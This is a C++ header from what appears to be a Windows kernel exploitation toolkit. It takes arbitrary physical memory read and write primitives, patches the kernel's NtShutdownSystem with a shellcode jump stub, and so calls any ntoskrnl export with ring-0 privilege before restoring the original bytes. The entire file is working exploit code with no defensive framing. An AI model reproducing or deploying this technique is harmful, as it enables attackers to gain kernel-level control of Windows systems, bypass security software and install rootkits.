#pragma once
#include "types.hpp"
#include "shared/drv.hpp"
#include "shared/pe.hpp"
#include "shared/asserts.hpp"

#include <functional>
#include <mutex>

namespace vdk
{
namespace map
{
namespace detail
{
/// \brief Custom prototype for NtShutdownSystem.
///
extern "C" long NtShutdownSystem(void*);
/// \brief Base address of ntoskrnl in kernel space.
///
extern void* kernel_base;
/// \brief Address of NtShutdownSystem in physical memory.
///
extern uint64_t shutdown_phy;
/// \brief Prepares environment, scans physical memory for NtShutdownSystem signature.
///
void setup(rdmem_t rdmem, wrmem_t wrmem);
};

/// \brief Prepares environment and executes user provided callback in CPL 0 by overwriting NtShutdownSystem.
///
void exec(cb_t, rdmem_t, wrmem_t);
/// \brief Execute kernel function and return results.
///
template<typename T, typename ...Tx>
std::invoke_result_t<T, Tx...> syscall(rdmem_t rdmem, wrmem_t wrmem, const char* api, Tx... args)
{
    detail::setup(rdmem, wrmem);
    // Read ntoskrnl.exe once.
    //
    static std::vector<uint8_t> raw;
    static std::once_flag flag;
    std::call_once(flag, [&]()
    {
        const auto& [base, size, name] = drv::ntoskrnl();
        fassert(drv::read_file(name, raw));
    });
    // For thread safety.
    //
    static std::mutex exploit;
    std::lock_guard guard(exploit);
    // Resolve api.
    //
    const auto api_rva = pe::get_export_rva(raw.data(), api);
    fassert(api_rva != 0);

    const auto api_va = reinterpret_cast<uint64_t>(detail::kernel_base) + api_rva;

    uint8_t stub[] =
    {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0
        0xFF, 0xE0,                                                 // jmp rax
    };
    // Setup shellcode stub.
    //
    std::memcpy(stub + 2, &api_va, sizeof(api_va));
    //
    uint8_t original[sizeof(stub)];
    // Read original bytes.
    //
    fassert(rdmem(detail::shutdown_phy, sizeof(stub), original));
    // Patch NtShutdownSystem with shellcode stub.
    //
    fassert(wrmem(detail::shutdown_phy, sizeof(stub), stub));
    // Execute syscall.
    //
    auto result = reinterpret_cast<T>(detail::NtShutdownSystem)(args...);
    // Patch back.
    //
    fassert(wrmem(detail::shutdown_phy, sizeof(stub), original));
    return result;
}
};
};
